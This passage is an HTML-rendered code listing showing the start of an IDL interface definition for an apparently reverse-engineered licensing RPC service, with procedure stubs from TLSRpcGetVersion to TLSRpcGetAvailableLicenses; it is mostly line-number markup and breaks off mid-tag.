class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">    uuid(<span class="number">3</span>d267954-eeb7<span class="number">-11</span>d1-b94e<span class="number">-00</span>c04fa3080d),</span><br><span class="line">        version(<span class="number">1.0</span>),</span><br><span class="line">]</span><br><span class="line">interface Example1</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc0_TLSRpcGetVersion</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [in][out]<span class="type">long</span>* arg_1)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc1_TLSRpcConnect</span><span class="params">(</span></span><br><span class="line"><span class="params">        [out][context_handle] <span class="type">void</span>** arg_1)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc2_TLSRpcDisconnect</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][out][context_handle] <span class="type">void</span>** arg_0)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc3_TLSRpcSendServerCertificate</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [in][range(<span class="number">0</span>, <span class="number">16384</span>)] <span class="type">long</span> arg_1,</span></span><br><span class="line"><span class="params">        [in][ref][size_is(arg_1)]<span class="comment">/*[range(0,16384)]*/</span> byte* arg_2,</span></span><br><span class="line"><span class="params">        [in][out]<span class="type">long</span>* arg_3)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc4_TLSRpcGetServerName</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [in][out][<span class="built_in">string</span>]<span class="comment">/*[range(0,256)]*/</span>  <span class="type">wchar_t</span>* arg_1,</span></span><br><span class="line"><span class="params">        [in][out]<span class="comment">/*[range(0,256)] */</span><span class="type">long</span>* arg_2,</span></span><br><span class="line"><span class="params">        [in][out]<span class="type">long</span>* arg_3)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc5_TLSRpcGetServerScope</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [in][out][<span class="built_in">string</span>]<span class="comment">/*[range(0,256)]*/</span>  <span class="type">wchar_t</span>* arg_1,</span></span><br><span class="line"><span class="params">        [in][out]<span class="comment">/*[range(0,256)] */</span><span class="type">long</span>* arg_2,</span></span><br><span class="line"><span class="params">        [in][out]<span class="type">long</span>* arg_3)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc6_TLSRpcGetInfo</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [in][range(<span class="number">0</span>, <span class="number">16384</span>)] <span class="type">long</span> arg_1,</span></span><br><span class="line"><span class="params">        [in][ref][size_is(arg_1)]<span class="comment">/*[range(0,16384)]*/</span> byte* arg_2,</span></span><br><span class="line"><span class="params">        [out]<span class="type">long</span>* arg_3,</span></span><br><span class="line"><span class="params">        [out][ref]<span class="comment">/*[range(0,0)]*/</span> byte** arg_4,</span></span><br><span class="line"><span class="params">        [out]<span class="type">long</span>* arg_5,</span></span><br><span class="line"><span class="params">        [out][ref]<span class="comment">/*[range(0,0)]*/</span> byte** arg_6,</span></span><br><span class="line"><span class="params">        [in][out]<span class="type">long</span>* arg_7)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc7_TLSRpcIssuePlatformChallenge</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [in]<span class="type">long</span> arg_1,</span></span><br><span class="line"><span class="params">        [out]<span class="type">long</span>* arg_2,</span></span><br><span class="line"><span class="params">        [out]<span class="type">long</span>* arg_3,</span></span><br><span class="line"><span class="params">        [out][ref]<span class="comment">/*[range(0,0)]*/</span> byte** arg_4,</span></span><br><span class="line"><span class="params">        [in][out]<span class="type">long</span>* arg_5)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc8_TLSRpcRequestNewLicense</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [in]<span class="type">long</span> arg_1,</span></span><br><span class="line"><span class="params">        [in]<span class="type">char</span>* arg_2,</span></span><br><span class="line"><span class="params">        [in][<span class="built_in">string</span>] <span class="type">wchar_t</span>* arg_3,</span></span><br><span class="line"><span class="params">        [in][<span class="built_in">string</span>] <span class="type">wchar_t</span>* arg_4,</span></span><br><span class="line"><span class="params">        [in][range(<span class="number">0</span>, <span class="number">16384</span>)] <span class="type">long</span> arg_5,</span></span><br><span class="line"><span class="params">        [in][ref][size_is(arg_5)]<span class="comment">/*[range(0,16384)]*/</span> byte* arg_6,</span></span><br><span class="line"><span class="params">        [in]<span class="type">long</span> arg_7,</span></span><br><span class="line"><span class="params">        [out]<span class="type">long</span>* arg_8,</span></span><br><span class="line"><span class="params">        [out][ref][size_is(, *arg_8)]<span class="comment">/*[range(0,0)]*/</span> byte** arg_9,</span></span><br><span class="line"><span class="params">        [in][out]<span class="type">long</span>* arg_10)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc9_TLSRpcUpgradeLicense</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [in]<span class="type">char</span>* arg_1,</span></span><br><span class="line"><span class="params">        [in]<span class="type">long</span> arg_2,</span></span><br><span class="line"><span class="params">        [in]<span class="type">long</span> arg_3,</span></span><br><span class="line"><span class="params">        [in][ref][size_is(arg_3)]<span class="comment">/*[range(0,0)]*/</span> byte* arg_4,</span></span><br><span class="line"><span class="params">        [in][range(<span class="number">0</span>, <span class="number">16384</span>)] <span class="type">long</span> arg_5,</span></span><br><span class="line"><span class="params">        [in][ref][size_is(arg_5)]<span class="comment">/*[range(0,16384)]*/</span> byte* arg_6,</span></span><br><span class="line"><span class="params">        [out]<span class="type">long</span>* arg_7,</span></span><br><span class="line"><span class="params">        [out][ref]<span class="comment">/*[range(0,0)]*/</span> byte** arg_8,</span></span><br><span class="line"><span class="params">        [in][out]<span class="type">long</span>* arg_9)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc10_TLSRpcAllocateConcurrentLicense</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [in][<span class="built_in">string</span>] <span class="type">wchar_t</span>* arg_1,</span></span><br><span class="line"><span class="params">        [in]<span class="type">char</span>* arg_2,</span></span><br><span class="line"><span class="params">        [in][out]<span class="type">long</span>* arg_3,</span></span><br><span class="line"><span class="params">        [in][out]<span class="type">long</span>* arg_4)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc11_TLSRpcGetLastError</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [in][out]<span class="comment">/*[range(0,256)] */</span><span class="type">long</span>* arg_1,</span></span><br><span class="line"><span class="params">        [in][out][<span class="built_in">string</span>]<span class="comment">/*[range(0,256)]*/</span>  <span class="type">wchar_t</span>* arg_2,</span></span><br><span class="line"><span class="params">        [in][out]<span class="type">long</span>* arg_3)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc12_TLSRpcKeyPackEnumBegin</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [in]<span class="type">long</span> arg_1,</span></span><br><span class="line"><span class="params">        [in]<span class="type">long</span> arg_2,</span></span><br><span class="line"><span class="params">        [in]<span class="type">char</span>* arg_3,</span></span><br><span class="line"><span class="params">        [in][out]<span class="type">long</span>* arg_4)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc13_TLSRpcKeyPackEnumNext</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [out]<span class="type">char</span>* arg_1,</span></span><br><span class="line"><span class="params">        [in][out]<span class="type">long</span>* arg_2)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc14_TLSRpcKeyPackEnumEnd</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [in][out]<span class="type">long</span>* arg_1)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc15_TLSRpcKeyPackAdd</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [in][out]<span class="type">char</span>* arg_1,</span></span><br><span class="line"><span class="params">        [in][out]<span class="type">long</span>* arg_2)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc16_TLSRpcKeyPackSetStatus</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [in]<span class="type">long</span> arg_1,</span></span><br><span class="line"><span class="params">        [in]<span class="type">char</span>* arg_2,</span></span><br><span class="line"><span class="params">        [in][out]<span class="type">long</span>* arg_3)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc17_TLSRpcLicenseEnumBegin</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [in]<span class="type">long</span> arg_1,</span></span><br><span class="line"><span class="params">        [in]<span class="type">long</span> arg_2,</span></span><br><span class="line"><span class="params">        [in]<span class="type">char</span>* arg_3,</span></span><br><span class="line"><span class="params">        [in][out]<span class="type">long</span>* arg_4)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc18_TLSRpcLicenseEnumNext</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [out]<span class="type">char</span>* arg_1,</span></span><br><span class="line"><span class="params">        [in][out]<span class="type">long</span>* arg_2)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc19_TLSRpcLicenseEnumEnd</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [in][out]<span class="type">long</span>* arg_1)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc20_TLSRpcAllocateConcurrentLicense</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [in]<span class="type">long</span> arg_1,</span></span><br><span class="line"><span class="params">        [in]<span class="type">char</span>* arg_2,</span></span><br><span class="line"><span class="params">        [in][out]<span class="type">long</span>* arg_3)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">error_status_t</span> <span class="title function_">Proc21_TLSRpcGetAvailableLicenses</span><span class="params">(</span></span><br><span class="line"><span class="params">        [in][context_handle] <span class="type">void</span>* arg_0,</span></span><br><span class="line"><span class="params">        [in]<span class="type">long</span> arg_1,</span></span><br><span class="line"><span class="params">        [in]<span class="type">char</span>* arg_2,</span></span><br><span class="line"><span class="params">        [out]<span class="type">long</span>* arg_3,</span></span><br><span class="line"><span class="params">        [in][out]<span class="type">long</span>* arg_4)</span>;</span><br><span class="line"></span><br><span class="line">    <span 